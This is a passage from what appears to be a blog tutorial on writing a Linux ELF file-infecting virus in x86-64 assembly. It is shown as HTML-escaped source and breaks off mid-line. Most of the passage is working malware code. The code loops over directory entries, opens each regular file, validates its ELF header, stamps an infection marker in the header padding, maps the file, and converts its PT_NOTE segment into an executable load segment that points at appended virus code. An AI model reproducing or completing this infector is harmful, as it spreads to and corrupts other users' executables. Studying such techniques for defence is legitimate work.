&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     r8w, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jl&lt;/span&gt;      loop_buf_dirent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp&lt;/span&gt;     loop_dir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;end_readdir:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_CLOSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MUNMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the &lt;code&gt;readdir&lt;/code&gt; function, we will loop through all the &lt;code&gt;linux_dirent64&lt;/code&gt; structures present in each of the target directories. If the current structure describes a regular file, we will call the &lt;code&gt;infect&lt;/code&gt; function with its name as argument to try to infect it.&lt;/p&gt;
&lt;h4 id=&#34;preliminary-checks&#34;&gt;Preliminary checks&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;infect&lt;/code&gt; function will be the main function of our program. To make the code more clean, I&amp;rsquo;ve defined a structure called &lt;code&gt;Infection_struct&lt;/code&gt; in &lt;code&gt;defines.s&lt;/code&gt; that will allow me, by considering the stack frame as this structure to use its fields as local variable names.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, INFECTOR_STRUCT_SIZE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     esi, O_RDWR
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_OPEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     eax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jl&lt;/span&gt;      quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd], eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_elfhdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, ELFHDR_SIZE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_READ
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rbx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_elfhdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rax, [rbx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_ident]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; ELF_MAGIC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_CLASS], &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; ELFCLASS64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_DATA], &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; ELFDATA2LSB       &lt;span style=&#34;color:#75715e&#34;&gt;; Only ELF 64 bits are being taken into account&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_PAD], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; INFECTION_MAGIC   &lt;span style=&#34;color:#75715e&#34;&gt;; We check them to avoid double infection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phnum]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    rdx, rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     ax, [rbx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_type]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     ax, ET_EXEC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      right_type_check
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     ax, ET_DYN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first part of this function is just about parsing the ELF header to check for several things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The file is a valid ELF file&lt;/li&gt;
&lt;li&gt;It is either an executable file or a shared object file&lt;/li&gt;
&lt;li&gt;It has not been infected yet&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since it is useless and memory-consuming to reinfect a file, we will prevent that to append. In the &lt;code&gt;e_ident&lt;/code&gt; field of the ELF header, there are some padding bytes that are unused and zero-filled. We will put an infection marker here to keep track of the already infected binaries.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;right_type_check:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rsi, rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, SEEK_END
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_LSEEK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize], rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r10, MAP_SHARED
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8d, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r9, r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                     &lt;span style=&#34;color:#75715e&#34;&gt;; We map the file into memory to operate on it&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map], rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_ident &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_PAD], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; INFECTION_MAGIC &lt;span style=&#34;color:#75715e&#34;&gt;; Mark binary for infection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phoff]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;movzx&lt;/span&gt;   rcx, &lt;span style=&#34;color:#66d9ef&#34;&gt;WORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phnum]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_phdrs:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_NOTE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     cmp_load_phdr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmp_load_phdr:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_LOAD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     next_phdr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_last_pt_load], r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;next_phdr:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8w, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phentsize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;    loop_phdrs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;check_if_note_exists:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    rax, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jz&lt;/span&gt;      munmap_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This next code chunk is gonna map the file into memory and get some information that are gonna be useful for the infection routine such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the file size&lt;/li&gt;
&lt;li&gt;the &lt;code&gt;PT_NOTE&lt;/code&gt; phdr address&lt;/li&gt;
&lt;li&gt;the last &lt;code&gt;PT_LOAD&lt;/code&gt; phdr address&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;infection&#34;&gt;Infection&lt;/h4&gt;
&lt;p&gt;Once we have every needed information, we can get to the serious part.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;patch_note_phdr:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_LOAD       &lt;span style=&#34;color:#75715e&#34;&gt;; We make it loadable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_flags], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PF_R &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PF_X  &lt;span style=&#34;color:#75715e&#34;&gt;; And executable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]     &lt;span style=&#34;color:#75715e&#34;&gt;; It starts at the EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_offset], rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_filesz], virus_len   &lt;span style=&#34;color:#75715e&#34;&gt;; We update the sizes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_memsz], virus_len
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_align], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;       &lt;span style=&#34;color:#75715e&#34;&gt;; And the alignement&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_last_pt_load]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rdx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr]                &lt;span style=&#34;color:#75715e&#34;&gt;; we get the last page used&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;and&lt;/span&gt;     cx, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf000&lt;/span&gt;                          &lt;span style=&#34;color:#75715e&#34;&gt;; we align the address on page border&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]           &lt;span style=&#34;color:#75715e&#34;&gt;; and we add the file size to it so that&lt;/span&gt;
